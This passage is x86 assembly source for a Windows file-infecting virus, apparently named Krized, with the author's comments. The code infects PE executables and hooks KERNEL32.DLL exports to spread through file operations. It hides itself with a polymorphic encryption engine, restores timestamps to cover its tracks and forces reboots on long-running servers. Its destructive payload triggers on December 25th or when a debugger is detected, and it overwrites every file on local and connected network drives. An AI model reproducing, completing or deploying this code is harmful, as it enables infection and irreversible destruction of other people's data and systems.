		PUSH    EDI

		XCHG    ECX, EAX
		CLD
		REP     MOVSB

		PUSH    ESI

		; Append the temporary virus filename to the
		; system-path, ie. C:\WINDOWS\SYSTEM\KRIZED.TT6.

		LEA     ESI, [EBP+(Infected_K32-START)]

		MOVSD
		MOVSD
		MOVSD

		; Append the original kernel filename to the
		; system-path, ie. C:\WINDOWS\SYSTEM\KERNEL32.DLL.

		POP     EDI

		LEA     ESI, [EBP+(KERNEL32_Name-START)]
		MOV     CL, 14
		REP     MOVSB

	; In the system-dir, copy KERNEL32.DLL to KRIZED.TT6.

		PUSH    1
		LEA     EAX, [EBX+(Infected_K32_Path-Virus_End)]
		PUSH    EAX
		LEA     EAX, [EBX+(Clean_K32_Path-Virus_End)]
		PUSH    EAX
		PUSH    ixCopyFileA
		INT     03h

		POP     EBX

		DEC     EAX                     ; Any problems doing it?
		JNZ     Free_Global_M

		MOV     [EBP+(Clear_Tracks_Sw-START)], AL

Open_Candidate: XOR     ESI, ESI
		JNZ     $-27

		PUSH    EBX                     ; Umm.. get it's attribs?
		PUSH    ixGetFileAttributesA
		INT     03h

		INC     EAX                     ; Ack, error.
		JZ      Clear_Tracks

		DEC     EAX                     ; Restore return value.

		PUSH    EAX
		PUSH    EBX

		AND     AL, NOT 00000001b       ; Readonly my ass..

		PUSH    EAX                     ; Strip readonly-flag.
		PUSH    EBX
		PUSH    ixSetFileAttributesA
		INT     03h

		OR      EAX, EAX                ; Test for error.
		JZ      Restore_Attr

		PUSH    ESI                     ; Open the candidate-file.
		PUSH    FILE_ATTRIBUTE_NORMAL
		PUSH    OPEN_EXISTING
		PUSH    ESI
		PUSH    ESI
		PUSH    GENERIC_READ OR GENERIC_WRITE
		PUSH    EBX
		PUSH    ixCreateFileA
		INT     03h

		MOV     [EBP+(File_Handle-START)], EAX

		INC     EAX                     ; Error?
		JZ      Restore_Attr

		MOV     EAX, [EBP+(Global_Handle-START)]
		ADD     EAX, (Time_Last_Write-Virus_End)

		PUSH    EAX

		PUSH    EAX                     ; Fetch it's time-stamps.
		SUB     EAX, 8
		PUSH    EAX
		SUB     EAX, 8
		PUSH    EAX
		PUSH    DWORD PTR [EBP+(File_Handle-START)]
		PUSH    ixGetFileTime
		INT     03h

		PUSH    ESI                     ; Map whole file.
		PUSH    ESI
		PUSH    ESI
		PUSH    PAGE_READONLY
		PUSH    ESI                     ; Standard security.
		PUSH    DWORD PTR [EBP+(File_Handle-START)]
		PUSH    ixCreateFileMappingA
		INT     03h

		OR      EAX, EAX                ; Error?
		JZ      Restore_Stamp

		MOV     [EBP+(Map_Handle-START)], EAX

		PUSH    ESI
		PUSH    ESI
		PUSH    ESI
		PUSH    FILE_MAP_READ
		PUSH    DWORD PTR [EBP+(Map_Handle-START)]
		PUSH    ixMapViewOfFile
		INT     03h

		OR      EAX, EAX                ; Error?
		JZ      Close_Mapping

		MOV     [EBP+(Map_Address-START)], EAX

		XCHG    EBX, EAX

		PUSH    ESI
		PUSH    DWORD PTR [EBP+(File_Handle-START)]
		PUSH    ixGetFileSize
		INT     03h

		CMP     EAX, 4096               ; Avoid too small files.
		JB      Abort_Checks

		CMP     [EBX.MZ_Mark], 'ZM'     ; It must be an .EXE-file.
		JNE     Abort_Checks

		CMP     [EBX.MZ_Reloc_Table], 40h  ; External header present?
		JB      Abort_Checks

		ADD     EBX, [EBX+3Ch]          ; Obtain pointer PE-header.

		CMP     [EBX.PE_Mark], 'EP'     ; PE-header is really there?
		JNE     Abort_Checks

		; Only infect 80386/80486/80586-files.

		CMP     [EBX.CPU_Type], 14Ch    ; 80386 compatibility?
		JB      Abort_Checks

		CMP     [EBX.CPU_Type], 14Eh    ; 80586 compatibility?
		JA      Abort_Checks

		CMP     BYTE PTR [EBP+(Infect_Mode-START)], 0
		JZ      Check_Our_Mark

		; Don't infect non-K32 DLL's.

		TEST    BYTE PTR [EBX.PE_Flags+1], 00100000b
		JNZ     Abort_Checks

Check_Our_Mark: XCHG    EDI, EAX

		MOVZX   EAX, [EBX.Object_Count]
		DEC     EAX
		PUSH    40
		POP     ECX
		MUL     ECX

		MOVZX   EDX, [EBX.NT_Header_Size]

		LEA     EDX, [EBX+24+EDX]

		ADD     EDX, EAX

		MOV     AL, BYTE PTR [EDX.Section_Flags+3]

		AND     AL, 11010000b           ; Strip all but our own
						; flags.

		CMP     AL, 11010000b           ; Already infected? (R/W/S).
		JE      Abort_Checks

		; Calculate physical size after infection.

		MOV     EAX, [EDX.Section_Physical_Offset]
		ADD     EAX, [EDX.Section_Physical_Size]
		ADD     EAX, Virus_Size + Poly_Size
		MOV     ECX, [EBX.File_Align]
		CALL    Align_EAX

		CMP     EAX, EDI                ; Host increases in size?
		JAE     Set_Inf_Size

		XCHG    EDI, EAX                ; Don't resize if not.

Set_Inf_Size:   MOV     [EBP+(Infected_Size-START)], EAX

		INC     ESI                     ; Mark as a valid candidate.
		JNS     Abort_Checks

		DB      0EAh                    ; Just a lame anti-?

Abort_Checks:   PUSH    DWORD PTR [EBP+(Map_Address-START)]
		PUSH    ixUnmapViewOfFile
		INT     03h

		PUSH    DWORD PTR [EBP+(Map_Handle-START)]
		PUSH    ixCloseHandle
		INT     03h

		DEC     ESI                     ; Valid host?
		JNZ     Restore_Stamp

		PUSH    ESI
		PUSH    DWORD PTR [EBP+(Infected_Size-START)]
		PUSH    ESI
		PUSH    PAGE_READWRITE
		PUSH    ESI                     ; Standard security.
		PUSH    DWORD PTR [EBP+(File_Handle-START)]
		PUSH    ixCreateFileMappingA
		INT     03h

		OR      EAX, EAX
		JZ      Restore_Stamp

		MOV     [EBP+(Map_Handle-START)], EAX

		PUSH    ESI
		PUSH    ESI
		PUSH    ESI
		PUSH    FILE_MAP_WRITE
		PUSH    DWORD PTR [EBP+(Map_Handle-START)]
		PUSH    ixMapViewOfFile
		INT     03h

		MOV     [EBP+(Map_Address-START)], EAX

		OR      EAX, EAX                ; Error?
		JZ      Close_Mapping

		XCHG    EDI, EAX                ; Base of mapped candidate.

		MOV     EBX, [EDI+3Ch]          ; PE-header of our candidate.
		ADD     EBX, EDI

		MOVZX   EAX, [EBX.Object_Count] ; Calculate offset of last
		DEC     EAX                     ; object-header.
		PUSH    40
		POP     ECX
		MUL     ECX

		; Size of formatted header.

		MOVZX   EDX, [EBX.NT_Header_Size]

		LEA     EDI, [EBX+24+EDX]

		PUSH    EDI                     ; Start object-headers.

		ADD     EDI, EAX                ; Last object-header.

		MOV     EAX, [EDI.Section_Physical_Size]

		PUSH    EAX

		ADD     EAX, Virus_Size + Poly_Size
		MOV     ECX, [EBX.File_Align]
		CALL    Align_EAX

		MOV     ESI, EAX

		XCHG    [EDI.Section_Physical_Size], EAX

		ADD     EAX, [EDI.Section_RVA]

		PUSH    EAX

		MOV     EAX, [EDI.Section_Virtual_Size]
		ADD     EAX, (Virus_Size + Poly_Size) - 1
		MOV     ECX, [EBX.Object_Align]

Calc_Virt_Size: INC     EAX
		CALL    Align_EAX

		CMP     EAX, ESI
		JB      Calc_Virt_Size

		MOV     [EDI.Section_Virtual_Size], EAX

		ADD     EAX, [EDI.Section_RVA]

		MOV     [EBX.Image_Size], EAX

		POP     EAX

		POP     ECX

		ADD     ECX, [EDI.Section_Physical_Offset]

		ADD     ECX, [EBP+(Map_Address-START)]

		MOV     EDX, EAX

		XCHG    [EBX.EIP_RVA], EAX

		CALL    Poly_Engine                     ; Lame poly-layer.

		POP     EDX

; Krized used to add a new section to the host, but unfortunately most NT
; files (including K32) don't have room for an extra object-header, this
; more or less forced me to use the append-to-the-last-section-method,
; which could technically cause instabilities.

		; Readable/writeable/shareable.

		OR      BYTE PTR [EDI.Section_Flags+3], 11010000b

		XOR     ECX, ECX

		; We're infecting KERNEL32.DLL ?

		CMP     [EBP+(Infect_Mode-START)], CL
		JNZ     Init_Succesful

		; Screw K32's build-time to force the loader
		; to patch executable's bound imports with our
		; hooked API-addresses in K32's export-table,
		; instead of using hardcoded addresses.

		INC     [EBX.PE_Date_Time]

		; Notify DLL of PROCESS_ATTACH, this is always
		; done regardless of these flags, but I rather
		; waste some bytes playing safe.

		OR      BYTE PTR [EBX.DLL_Flags], 00000001b

		; Now change the exports of K32 to point
		; to the virus' own handlers.

		LEA     ESI, [EBP+(Hook_Exports-START)]

		CLD

Hook_Export:    LODSD                           ; Get array entry in export.

		XCHG    EDI, EAX

                ; Convert the RVA to a physical address.

Find_RVA:       MOV     EAX, [EDX.Section_RVA]
		ADD     EAX, [EDX.Section_Virtual_Size]

		CMP     EDI, EAX                ; RVA is in section's space?
		JB      Calculate_Phys

		ADD     EDX, 40                 ; Next section.

		JMP     Find_RVA

Calculate_Phys: SUB     EDI, [EDX.Section_RVA]
		ADD     EDI, [EDX.Section_Physical_Offset]

		MOVZX   EAX, WORD PTR [EBP+(Dispatch_API-START)+(ECX*2)]

		ADD     EAX, 12345678h
New_Virus_RVA   =       DWORD PTR $-4

		ADD     EDI, [EBP+(Map_Address-START)]
		STOSD

Cont_Hook_Loop: INC     ECX

		CMP     CL, Hook_API_Count      ; Did 'em all?
		JB      Hook_Export

		MOV     ESI, [EBP+(Global_Handle-START)]

		; Attemp to register a file-update to replace the
		; original KERNEL32.DLL with the infected one at
		; the next boot-up.

		PUSH    MOVEFILE_DELAY_UNTIL_REBOOT OR MOVEFILE_REPLACE_EXISTING
		LEA     EAX, [ESI+(Clean_K32_Path-Virus_End)]
		PUSH    EAX
		LEA     EAX, [ESI+(Infected_K32_Path-Virus_End)]
		PUSH    EAX
		PUSH    ixMoveFileExA
		INT     03h

                OR      EAX, EAX                ; Successful?
		JNZ     Init_Succesful

                PUSH    ixGetLastError          ; Get extended error-
                INT     03h                     ; information.

                ; Access denied or function not available?

                CMP     EAX, ERROR_ACCESS_DENIED
                JE      Unmap_View

		; Else do it the Win9x-way...

		CALL    @2
		DB      'WININIT.INI', 0
@2:             LEA     EAX, [ESI+(Infected_K32_Path-Virus_End)]
		PUSH    EAX
		LEA     EAX, [ESI+(Clean_K32_Path-Virus_End)]
		PUSH    EAX
		CALL    @3
		DB      'rename', 0
@3:             PUSH    ixWritePrivateProfileStringA
		INT     03h

		XCHG    ECX, EAX                ; Fuck, user doesn't seem
		JECXZ   Unmap_View              ; to have admin-priviliges.

Init_Succesful: XOR     EDX, EDX

		MOV     BYTE PTR [EBP+(Clear_Tracks_Sw-START)], (Free_Global_M-Clear_Tracks_Sw) - 1

		CMP     [EBP+(Infect_Mode-START)], DL
		JNZ     Test_Checksum

		MOV     BYTE PTR [EBP+(Clear_Tracks_Sw-START)], (Reboot_Test-Clear_Tracks_Sw) - 1

Test_Checksum:  CMP     [EBX.PE_Checksum], EDX  ; This file is checksummed?
		JZ      Unmap_View

	; Check out CheckSumMappedFile and notice how it uses an
	; entirely different algorithm, as usual, weird stuph..

		MOV     [EBX.PE_Checksum], EDX

		MOV     ESI, [EBP+(Map_Address-START)]

		MOV     ECX, 12345678h
Infected_Size   =       DWORD PTR $-4

		SHR     ECX, 1                  ; Words.

Checksum_Loop:  MOVZX   EAX, WORD PTR [ESI]

		ADD     EDX, EAX
		MOV     EAX, EDX

		AND     EDX, 0FFFFh             ; Convert to 16-bit word.
		SHR     EAX, 16
		ADD     EDX, EAX

		INC     ESI
		INC     ESI

		LOOP    Checksum_Loop

		MOV     EAX, EDX

		SHR     EAX, 16

		ADD     AX, DX

		ADD     EAX, [EBP+(Infected_Size-START)]

		MOV     [EBX.PE_Checksum], EAX

Unmap_View:     PUSH    12345678h
Map_Address     =       DWORD PTR $-4
		PUSH    ixUnmapViewOfFile
		INT     03h

Close_Mapping:  PUSH    12345678h
Map_Handle      =       DWORD PTR $-4
		PUSH    ixCloseHandle
		INT     03h

Restore_Stamp:  POP     EAX                     ; Restore file's original
						; time-stamps.
		PUSH    EAX
		SUB     EAX, 8
		PUSH    EAX
		SUB     EAX, 8
		PUSH    EAX
		PUSH    DWORD PTR [EBP+(File_Handle-START)]
		PUSH    ixSetFileTime
		INT     03h

Close_File:     PUSH    12345678h               ; And finally close the file.
File_Handle     =       DWORD PTR $-4
		PUSH    ixCloseHandle
		INT     03h

		; Restore the file's original attributes.

Restore_Attr:   CMP     BYTE PTR [EBP+(Clear_Tracks_Sw-START)], 0
		JNZ     Set_Attributes

		; Trash-copy must be deletable.

		AND     BYTE PTR [ESP+(1*4)], NOT 00000001b

Set_Attributes: PUSH    ixSetFileAttributesA
		INT     03h

	; If something went wrong while in the process of infecting
	; an KERNEL32.DLL-copy, clean up our trash by deleting it.

Clear_Tracks:   JMP     $
Clear_Tracks_Sw =       BYTE PTR $-1

		PUSH    12345678h               ; Delete KRIZED.TT6 in the
Offset_Inf_K32  =       DWORD PTR $-4           ; system-directory.
		PUSH    ixDeleteFileA
		INT     03h

		JMP     Free_Global_M

	; Here we initialize the virus to reboot the system if it has been
	; running for over approximately 3 days. Server-systems often run
	; for years constantly, and our virus can't become resident until
	; the next system-boot, hence this routine.

Reboot_Test:    PUSH    ixGetTickCount          ; Retrieve tickcount since
		INT     03h                     ; Windoze was started.

		OR      EAX, EAX                ; Less than approximately
		JNS     Free_Global_M           ; 3 days?

		CALL    @4                      ; Load USER32.DLL as we need
		DB      'USER32', 0             ; one of it's functions.
@4:             PUSH    ixLoadLibraryA
		INT     03h

		CALL    @5                      ; Retrieve API-address.
		DB      'ExitWindowsEx', 0
@5:             PUSH    EAX
		PUSH    ixGetProcAddress
		INT     03h

		; Store the address for later use.

		MOV     [EBP+(ExitWindowsEx-START)], EAX

Free_Global_M:  PUSH    12345678h               ; Free our global allocated
Global_Handle   =       DWORD PTR $-4           ; memory.
		PUSH    ixGlobalFree
		INT     03h

Rest_Inf_SEH:   XOR     EAX, EAX                ; Unhook our SEH.

		POP     DWORD PTR FS:[EAX]
		POP     EBX

		POPAD                           ; Restore reggies..

		RET                             ; And we're done.


; Some humble poly-engine, it builds decryptors with random registers
; peppered with some simple junk. It won't keep-out the average AV,
; but it's effective enough against public-domain AV-scanners based on
; pure signature-scanning.

; So get me an official opcode list and I'll throw out the lame table-
; driven polymorphics :P

Poly_Engine:
		PUSHAD

		PUSH    EAX

Gen_Decryptor:  MOV     EDI, [ESP+(7*4)]        ; ECX on entry.

		PUSH    13                      ; Pick a DWORD stacker.
		POP     EAX
		CALL    Get_Random

		MOV     AL, [EBP+(PUSH_Reg32-START)+EAX]
		STOSB

		MOV     AL, 9Ch                 ; PUSHFD
		STOSB

		MOV     AL, 60h                 ; PUSHAD
		STOSB

		CALL    Add_Garbage

		MOV     AL, 0E8h                ; CALL
		STOSB

		MOV     AL, 10
		CALL    Get_Random

		INC     EAX
		STOSD

		MOV     ESI, EDI

		XCHG    ECX, EAX

Add_Random:     MOV     EAX, ESP
		CALL    Get_Random

		STOSB

		LOOP    Add_Random

		PUSH    7
		POP     EAX
		CALL    Get_Random

		XCHG    EBX, EAX

		MOV     AL, [EBP+(POP_Reg32-START)+EBX]
		STOSB

		CALL    Get_Free_Reg

		XCHG    EDX, EAX

		CALL    Add_Garbage

		MOV     AL, [EBP+(MOV_Reg32-START)+EDX]  ; MOV Cntr_Reg
		STOSB

		MOV     AX, Virus_Size
		STOSD

		CALL    Add_Garbage

		MOV     [EBP+(Decrypt_Loop-START)], EDI

		CALL    Add_Garbage

		MOV     AL, 0FFh
		CALL    Get_Random
		JP      Construct_XOR           ; 1/2 chance of including DS:

		MOV     AL, 3Eh                 ; DS:
		STOSB

Construct_XOR:  MOV     AL, 80h
		STOSB

		MOV     AL, [EBP+(XOR_Ptr_Reg32-START)+EBX]
		STOSB

		MOV     [EBP+(Patch_Delta-START)], EDI

		MOV     AX, Virus_Size-1
		STOSD

Get_Random_Key: CALL    Get_Random

		OR      AL, AL
		JZ      Get_Random_Key

		STOSB

		PUSH    EAX

		CALL    Add_Garbage

		MOV     AL, [EBP+(DEC_Reg32-START)+EBX]
		STOSB

		CALL    Add_Garbage

		MOV     AL, [EBP+(DEC_Reg32-START)+EDX]
		STOSB

		MOV     AL, 75h                 ; JNZ
		STOSB

		MOV     EAX, EDI

		SUB     EAX, 12345678h
Decrypt_Loop    =       DWORD PTR $-4
		NOT     EAX
		STOSB

		POP     EDX

		MOV     EAX, EDI
		SUB     EAX, ESI

		ADD     DS:[12345678h], EAX
Patch_Delta     =       DWORD PTR $-4

		MOV     EAX, EDI                ; Calculate size decryptor.
		SUB     EAX, [ESP+(7*4)]

		CMP     EAX, 140                ; Too large? Start over then.
		JNB     Gen_Decryptor

		CMP     AL, 120                 ; Too small? Ditto.
		JB      Gen_Decryptor

		PUSH    EDI

		MOV     ESI, EBP
		MOV     CX, Virus_Size
		REP     MOVSB

		ADD     EAX, [ESP+(7*4)]        ; EDX at entry.

		MOV     [EBP+(New_Virus_RVA-START)], EAX

		MOV     [EDI+(Virus_RVA-START)-Virus_Size], EAX

		POP     EAX

		SUB     EAX, [EBP+(Patch_Delta-START)]

		SUB     EAX, 4

		NEG     EAX

		MOV     [EDI+(Patch_Decrypt-START)-Virus_Size], EAX

		MOV     [EDI+(Busy_Switch-START)-Virus_Size], CL

		MOV     WORD PTR [EDI+(Unicode_Switch-START)-Virus_Size], 90ACh

		MOV     [EDI+(Delay_Timer-START)-Virus_Size], CL

		MOV     BYTE PTR [EDI+(Init_Mode-START)-Virus_Size], (CALL_Setup_SEH-Init_Mode) - 1

		CMP     [EBP+(Infect_Mode-START)], CL
		JNZ     POP_New_EIP

		MOV     [EDI+(Init_Mode-START)-Virus_Size], CL

POP_New_EIP:    POP     DWORD PTR [EDI+(Host_EIP-START)-Virus_Size]

		MOV     ECX, Virus_Size

Encrypt_Virus:  DEC     EDI

		XOR     [EDI], DL

		LOOP    Encrypt_Virus

		POPAD

		RET


Add_Garbage:
		PUSH    8
		POP     EAX
		CALL    Get_Random

		INC     EAX

		XCHG    ECX, EAX

Add_Junk:       PUSH    ECX

		PUSH    5
		POP     EAX
		CALL    Get_Random
		JZ      End_Junk_Loop

		DEC     EAX
		JZ      Junk_ADD_Reg32

		DEC     EAX
		JZ      Junk_DEC_Reg32

Junk_MOV_Reg32: CALL    Get_Free_Reg

		MOV     AL, [EBP+(MOV_Reg32-START)+EAX]
		STOSB

		MOV     EAX, ESP
		CALL    Get_Random

		STOSD

		JMP     End_Junk_Loop

Junk_DEC_Reg32: CALL    Get_Free_Reg

		MOV     AL, [EBP+(DEC_Reg32-START)+EAX]
		STOSB

		JMP     End_Junk_Loop

Junk_ADD_Reg32: MOV     AL, 81h
		STOSB

		CALL    Get_Free_Reg

		MOV     AL, [EBP+(ADD_Reg32-START)+EAX]
		STOSB

		MOV     EAX, ESP
		CALL    Get_Random

		STOSD

End_Junk_Loop:  POP     ECX

		LOOP    Add_Junk

		XOR     EAX, EAX

		RET


Get_Free_Reg:
		PUSH    7
		POP     EAX
		CALL    Get_Random

		CMP     EAX, EBX
		JE      Get_Free_Reg

		CMP     EAX, EDX
		JE      Get_Free_Reg

		RET


Align_EAX:
		XOR     EDX, EDX
		DIV     ECX

		OR      EDX, EDX
		JZ      Calc_Aligned

		INC     EAX

Calc_Aligned:   MUL     ECX

		RET


Get_Delta:
		CALL    Get_EIP
Get_EIP:        POP     EBP
		SUB     EBP, (Get_EIP-START)

		RET


Hook_CopyFileA:

		MOV     AL, ixCopyFileA
		JMP     Main_Dispatch


Hook_CreateFileA:

		MOV     AL, ixCreateFileA
		JMP     Main_Dispatch


Hook_CreateProcessA:

		MOV     AL, ixCreateProcessA
		JMP     Main_Dispatch


Hook_DeleteFileA:

		MOV     AL, ixDeleteFileA
		JMP     Main_Dispatch


Hook_GetFileAttributesA:

		MOV     AL, ixGetFileAttributesA
		JMP     Main_Dispatch


Hook_MoveFileA:

		MOV     AL, ixMoveFileA
		JMP     Main_Dispatch


Hook_MoveFileExA:

		MOV     AL, ixMoveFileExA
		JMP     Main_Dispatch


Hook_SetFileAttributesA:

		MOV     AL, ixSetFileAttributesA
		JMP     Main_Dispatch


Hook_CopyFileW:

		MOV     AL, ixCopyFileW
		JMP     Main_Dispatch


Hook_CreateFileW:

		MOV     AL, ixCreateFileW
		JMP     Main_Dispatch


Hook_CreateProcessW:

		MOV     AL, ixCreateProcessW
		JMP     Main_Dispatch


Hook_DeleteFileW:

		MOV     AL, ixDeleteFileW
		JMP     Main_Dispatch


Hook_GetFileAttributesW:

		MOV     AL, ixGetFileAttributesW
		JMP     Main_Dispatch


Hook_MoveFileW:

		MOV     AL, ixMoveFileW
		JMP     Main_Dispatch


Hook_MoveFileExW:

		MOV     AL, ixMoveFileExW
		JMP     Main_Dispatch


Hook_SetFileAttributesW:

		MOV     AL, ixSetFileAttributesW

Main_Dispatch:  PUSH    ESI
		PUSH    EBP

		AND     EAX, 000000FFh

		CALL    Get_Delta

		JMP     $
Busy_Switch     =       BYTE PTR $-1

		; Set busy-flag to prevent re-entrancy.

		MOV     BYTE PTR [EBP+(Busy_Switch-START)], (Do_Old_Handler-Busy_Switch) - 1

		; LODSB / NOP

		MOV     WORD PTR [EBP+(Unicode_Switch-START)], 90ACh

		CMP     AL, 08                  ; Unicode function?
		JB      Do_Infect

		; LODSW

		MOV     WORD PTR [EBP+(Unicode_Switch-START)], 0AD66h

Do_Infect:      MOV     ESI, [ESP+(3*4)]        ; Infect the sucker.
		CALL    Infect_File

		; Clear busy-flag.

		MOV     [EBP+(Busy_Switch-START)], AH

Do_Old_Handler: MOV     EAX, [EBP+(API_Addresses-START)+(EAX*4)]

		SUB     EBP, [EBP+(Virus_RVA-START)]

		ADD     EAX, EBP

		POP     EBP
		POP     ESI

		JMP     EAX                     ; JMP to the original API.



Perform_API:
                PUSH    0
Work_API_Index  =       BYTE PTR $-1
                POP     EAX

		CMP     [EBP+(Init_Mode-START)], AH

		MOV     EAX, [EBP+(API_Addresses-START)+(EAX*4)]

		JZ      Calc_K32_Base

Use_Init_Base:  ADD     EAX, 12345678h
K32_Base        =       DWORD PTR $-4

		JMP     EAX

Calc_K32_Base:  ADD     EAX, EBP
		SUB     EAX, [EBP+(Virus_RVA-START)]

		JMP     EAX



; ESI = ASCIIZ / returns AX = CRC16.
Calculate_CRC16:
		PUSH    EDX
		PUSH    ESI

		PUSH    0FFFFFFFFh
		POP     EDX

		CLD

Load_Character: LODSB

		OR      AL, AL
		JZ      Exit_Calc_CRC

		XOR     DL, AL

		MOV     AL, 8

CRC_Byte:       SHR     EDX, 1
		JNC     Loop_CRC_Byte

		XOR     EDX, 0EDB88320h

Loop_CRC_Byte:  DEC     AL
		JNZ     CRC_Byte

		JMP     Load_Character

Exit_Calc_CRC:  XCHG    EDX, EAX

		POP     ESI
		POP     EDX

		RET


; Activates the payload if the current date is
; December 25th or when Soft-Ice is detected.
Check_For_Payload:

		PUSHAD

		; Try to detect the presence of Soft-Ice
		; version 3.xx & 4.xx (9x/NT).

		XOR     EBX, EBX

		PUSH    EBX                     ; Soft-Ice's 9x driver is
		PUSH    EBX                     ; present?
		PUSH    OPEN_EXISTING
		PUSH    EBX
		PUSH    EBX
		PUSH    EBX
		CALL    @6
		DB      '\\.\SICE', 0
@6:             PUSH    ixCreateFileA
		INT     03h

		INC     EAX                     ; Immediate retaliation!
		JNZ     Payload

		PUSH    EBX                     ; Soft-Ice's NT driver is
		PUSH    EBX                     ; present?
		PUSH    OPEN_EXISTING
		PUSH    EBX
		PUSH    EBX
		PUSH    EBX
		CALL    @7
		DB      '\\.\NTICE', 0
@7:             PUSH    ixCreateFileA
		INT     03h

		INC     EAX                     ; Immediate retaliation!
		JNZ     Payload

		MOV     ESI, (Local_Time-Virus_End)
		ADD     ESI, [EBP+(Global_Handle-START)]
		PUSH    ESI
		PUSH    ixGetLocalTime
		INT     03h

		CMP     BYTE PTR [ESI.Current_Month], 12
		JNE     Exit_Check_PL

		CMP     BYTE PTR [ESI.Current_Day], 25
		JNE     Exit_Check_PL

        ; Most likely we aren't yet connected to the network so it's
        ; better to wait some time before we start destroying.

		INC     BYTE PTR [EBP+(Delay_Timer-START)]
		JZ      Payload

Exit_Check_PL:  POPAD

		RET

Delay_Timer     DB      0

; Let's get ready to r0ck..
Payload:
		CALL    Setup_Nuke_SEH

		CALL    Get_Delta

		XOR     EBX, EBX

		MOV     ESP, [ESP+(2*4)]

		JMP     Rest_Nuke_SEH

Setup_Nuke_SEH: PUSH    DWORD PTR FS:[EBX]
		MOV     FS:[EBX], ESP

		PUSH    EAX                     ; Obtain IDT.
		SIDT    [ESP-2]
		POP     EAX

		; Our ring-0 INT exception-handler.

		LEA     ECX, [EBP+(Ring0_Handler-START)]

		XCHG    [EAX+(3*8)], CX         ; Set our own ring-0 handler.

		ROR     ECX, 16

		XCHG    [EAX+(3*8)+6], CX

                INT     03h                     ; Raise ring-0 exception.

		MOV     [EAX+(3*8)+6], CX       ; Restore original handler.

		ROR     ECX, 16

		MOV     [EAX+(3*8)], CX

Rest_Nuke_SEH:  POP     DWORD PTR FS:[EBX]      ; Restore original SEH.
		POP     EAX

                MOV     EDI, [EBP+(Global_Handle-START)]  ; Kill-list.

		PUSH    EDI

		CALL    @8                      ; Load network-library.
		DB      'MPR', 0
@8:             PUSH    ixLoadLibraryA
		INT     03h

		XCHG    ECX, EAX                ; Error?
		JECXZ   JECXZ_Enum_L

		MOV     EBX, ECX                ; Save base in EBX.

		CALL    @9
		DB      'WNetOpenEnumA', 0
@9:             PUSH    EBX
		PUSH    ixGetProcAddress
		INT     03h

		XCHG    ECX, EAX
		JECXZ   Enum_Locals

		MOV     [EBP+(WNetOpenEnumA-START)], ECX

		CALL    @10
		DB      'WNetEnumResourceA', 0
@10:            PUSH    EBX
		PUSH    ixGetProcAddress
		INT     03h

		XCHG    ECX, EAX
JECXZ_Enum_L:   JECXZ   Enum_Locals

		MOV     [EBP+(WNetEnumResourceA-START)], ECX

		CALL    @11                     ; Retrieve a find handle
Enum_Handle     DD      0                       ; to the system root.
@11:            PUSH    0
		PUSH    0
		PUSH    RESOURCETYPE_DISK
		PUSH    RESOURCE_CONNECTED
		CALL    [EBP+(WNetOpenEnumA-START)]

		OR      EAX, EAX
		JNZ     Enum_Locals

                ; Enumerate all active network-connections.

Retrieve_Enum:  LEA     ESI, [EBP+(Net_Resource-START)]

		CALL    @12
Buffer_Size     DD      666
@12:            PUSH    ESI
		CALL    @13
Enum_Count      DD      1
@13:            PUSH    DWORD PTR [EBP+(Enum_Handle-START)]
		CALL    [EBP+(WNetEnumResourceA-START)]

		OR      EAX, EAX
		JNZ     Enum_Locals

		MOV     ESI, [ESI+(5*4)]        ; Found remote name.

		CLD

Copy_Target:    LODSB                           ; Copy the remote name to
		STOSB                           ; our kill-list.

		OR      AL, AL                  ; Did the entire ASCIIZ ?
		JNZ     Copy_Target

		JMP     Retrieve_Enum

Enum_Locals:    POP     ESI                     ; Array of network-drives.

		PUSH    EDI                     ; Append local drives.
		PUSH    256
		PUSH    ixGetLogicalDriveStringsA
		INT     03h

Drive_Loop:     PUSH    ESI                     ; What kind of disk is this?
		PUSH    ixGetDriveTypeA
		INT     03h

                CMP     AL, DRIVE_REMOVABLE     ; Skip floppy-drives.
                JE      Find_Next_Str

                CMP     AL, DRIVE_CDROM         ; Skip CD-ROM's.
                JE      Find_Next_Str

                CMP     AL, DRIVE_RAMDISK       ; Skip RAM-disks.
                JE      Find_Next_Str

CALL_Trash_Dir: CALL    Trash_Directory         ; Trash the root including
						; all it's sub-directories.

Find_Next_Str:  CLD                             ; Fetch next byte.
		LODSB

		OR      AL, AL                  ; Found the end of ASCIIZ ?
		JNZ     Find_Next_Str

		CMP     [ESI], AL
		JNZ     Drive_Loop              ; Thank you DRIVE through :P

		JMP     $                       ; Heart stops..

;-----------------------------------
; Overwrites all bytes in all files
; in all directories on all drives.
;-----------------------------------
Trash_Directory:

		PUSHAD

		SUB     ESP, (318+260+2)        ; Reserve space on the stack,
						; note that ESP must always
						; point to a DWORD boundary.

		LEA     EAX, [ESP+318]          ; Save our current directory.
		PUSH    EAX
		PUSH    260
		PUSH    ixGetCurrentDirectoryA
		INT     03h

		CMP     EAX, 260                ; Too big for our buffer?
		JA      JNZ_Exit_Trash

		XCHG    ECX, EAX                ; Or the function failed?
		JECXZ   JNZ_Exit_Trash

		PUSH    ESI                     ; Change to found directory.
		PUSH    ixSetCurrentDirectoryA
		INT     03h

		DEC     EAX                     ; Argh! something went wrong!
JNZ_Exit_Trash: JNZ     Exit_Trash_Dir

                XCHG    EBX, EAX                ; EBX = 0.

		PUSH    ESP                     ; Find us a victim.
		CALL    @14
		DB      '*.*', 0                ; Kill 'em all!
@14:            PUSH    ixFindFirstFileA
		INT     03h

		MOV     EDI, EAX

		INC     EAX
		JZ      Close_Find

Destroy_Loop:   LEA     ESI, [ESP.FFN_File_Name]

		; Is it a directory?

		TEST    BYTE PTR [ESP.File_Attributes], 00010000b
		JZ      Trash_File

		CMP     WORD PTR [ESI], '.'     ; Fuck for '.'...
		JE      Find_Next_Crap

		CMP     WORD PTR [ESI], '..'    ; Or '..'.
		JNE     Do_Trash_Dir

                CMP     [ESI+2], BL             ; /0.
		JZ      Find_Next_Crap

Do_Trash_Dir:   CALL    Trash_Directory

		JMP     Find_Next_Crap

Trash_File:     PUSH    FILE_ATTRIBUTE_NORMAL   ; Clear all it's attributes.
                PUSH    ESI
                PUSH    ixSetFileAttributesA
                INT     03h

                XCHG    ECX, EAX
                JECXZ   Find_Next_Crap

                PUSH    EBX                     ; Open the target.
		PUSH    FILE_ATTRIBUTE_NORMAL
		PUSH    OPEN_EXISTING
		PUSH    EBX
		PUSH    EBX
                PUSH    GENERIC_WRITE
		PUSH    ESI
		PUSH    ixCreateFileA
		INT     03h

		MOV     ESI, EAX

		INC     EAX
		JZ      Find_Next_Crap

                PUSH    EBX                     ; Get it's filesize.
		PUSH    ESI
